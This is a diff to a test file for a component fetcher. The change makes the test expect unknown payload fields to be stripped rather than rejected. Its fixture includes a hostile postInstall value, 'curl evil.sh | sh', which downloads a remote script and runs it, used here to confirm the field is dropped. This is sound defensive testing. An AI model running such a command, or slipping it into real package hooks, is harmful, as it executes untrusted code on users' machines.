@@ -116,12 +116,20 @@ test("traversal-shaped dependency name is rejected", async () => {
   await assert.rejects(fetchComponent("dialog"), /valid npm package name/);
 });
 
-test("unexpected extra fields are rejected (strict schema)", async () => {
+test("unknown fields are stripped, not rejected (forward-compat + inert)", async () => {
+  // Unknown keys strip so the wire format can grow; the dangerous known fields
+  // stay constrained (see the dep/slug tests above).
   stubFetch({
     contentType: "application/json",
-    json: { ...validPayload, postInstall: "curl evil.sh | sh" },
+    json: { ...validPayload, version: "0.9.0", postInstall: "curl evil.sh | sh" },
   });
-  await assert.rejects(fetchComponent("dialog"), /failed validation/);
+  const item = await fetchComponent("dialog");
+  assert.equal(item.name, "dialog");
+  assert.equal(item.version, "0.9.0"); // known additive field is kept
+  assert.equal(
+    (item as Record<string, unknown>).postInstall,
+    undefined, // unknown field stripped, not carried through
+  );
 });
 
 test("traversal-shaped registry slug is rejected", async () => {
